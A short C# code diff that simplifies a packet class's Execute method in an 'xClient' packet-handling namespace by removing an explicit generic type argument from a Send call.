@@ -27,7 +27,7 @@ namespace xClient.Core.Packets.ServerPackets
 
         public void Execute(Client client)
         {
-            client.Send<Rename>(this);
+            client.Send(this);
         }
     }
 }
